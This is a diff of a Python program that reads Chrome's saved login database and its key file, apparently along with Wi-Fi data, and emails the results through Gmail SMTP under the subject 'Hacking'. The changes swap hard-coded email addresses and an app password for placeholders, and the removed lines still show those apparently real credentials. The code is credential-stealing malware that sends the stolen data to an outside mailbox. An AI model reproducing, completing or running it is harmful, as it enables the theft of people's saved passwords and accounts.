@@ -14,11 +14,11 @@ wifi_db = 'wifi.db'
 path_local = r'AppData\Local\Google\Chrome\User Data\Local State'
 path_login = r'AppData\Local\Google\Chrome\User Data\default\Login Data'
 
-ADDR = 'xablau.mpx@gmail.com'
+ADDR = 'SENDER_GMAIL'
 msg = MIMEMultipart()
 msg['Subject'] = 'Hacking'
 msg['From'] = ADDR
-msg['To'] = 'vinibruno99@gmail.com'
+msg['To'] = 'REICEIVED_GMAIL'
 
 def getPassword():
     with open(os.environ['userprofile'] + os.sep + path_local, 'r', encoding='utf-8') as get_path:
@@ -91,7 +91,7 @@ def Send_Email():
     with smtplib.SMTP(host='smtp.gmail.com', port=587) as smtp:
         try:
             smtp.starttls(context=context)
-            smtp.login(msg['From'], 'anwuekaywkgmsueb')
+            smtp.login(msg['From'], 'YOUR_PASSWORD')
             smtp.sendmail(msg['From'], msg['To'], msg.as_string())
             return 'Email Send Sucess'
 
